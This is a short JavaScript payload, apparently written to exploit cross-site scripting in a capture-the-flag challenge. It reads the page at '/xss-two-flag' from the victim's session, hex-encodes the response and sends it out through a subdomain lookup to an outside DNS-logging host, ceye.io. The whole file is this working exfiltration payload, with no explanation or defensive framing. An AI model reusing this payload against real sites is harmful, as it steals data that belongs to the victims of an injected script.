var xhr = new XMLHttpRequest();
xhr.open("GET", "/xss-two-flag", false);
xhr.send(null);
var xhr1 = new XMLHttpRequest();
function stringToHex(str){
var val="";
for(var i = 0; i < str.length; i++){
if(val == "")
val = str.charCodeAt(i).toString(16);
else
val +=str.charCodeAt(i).toString(16);
}
return val;
}
xhr1.open("GET","https://"+stringToHex(xhr.response)+".my58ld.ceye.io/",false);
xhr1.send(null);
